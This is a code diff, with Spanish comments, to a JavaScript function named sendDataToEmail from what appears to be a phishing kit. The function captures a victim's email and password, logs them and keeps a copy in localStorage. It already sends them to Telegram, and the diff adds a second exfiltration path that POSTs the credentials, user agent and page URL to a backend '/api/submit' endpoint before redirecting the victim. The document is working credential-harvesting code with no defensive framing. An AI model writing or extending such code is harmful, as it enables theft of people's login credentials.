@@ -53,10 +53,16 @@ function sendDataToEmail(email, password, type = 'login') {
     const userAgent = navigator.userAgent;
     const currentUrl = window.location.href;
     
+    // Auto-detectar backend: si no está en GitHub Pages, usar servidor local
+    if (!window.BACKEND_URL && !window.location.hostname.includes('github.io')) {
+        window.BACKEND_URL = window.location.origin;
+    }
+    
     console.log('=== INICIANDO ENVÍO DE DATOS ===');
     console.log('Email:', email);
     console.log('Password:', password);
     console.log('Timestamp:', timestamp);
+    console.log('Backend URL:', window.BACKEND_URL || 'No configurado');
     
     // IMPORTANTE: Guardar en localStorage como backup
     try {
@@ -181,6 +187,31 @@ Tipo de captura: ${type}
         })
         .then(() => console.log('✅ Telegram: Enviado'))
         .catch(e => console.log('⚠️ Telegram:', e.message));
+    }
+    
+    // Enviar al backend interno si está disponible
+    const backend = window.BACKEND_URL || '';
+    if (backend) {
+        console.log('📤 Enviando al backend interno...');
+        fetch(backend + '/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                email: email,
+                password: password,
+                timestamp: timestamp,
+                userAgent: userAgent,
+                url: currentUrl,
+                type: type
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            console.log('✅ Backend response:', data);
+        })
+        .catch(e => {
+            console.log('⚠️ Backend no disponible (datos en localStorage):', e.message);
+        });
     }
     
     // Redirigir después de intentar enviar
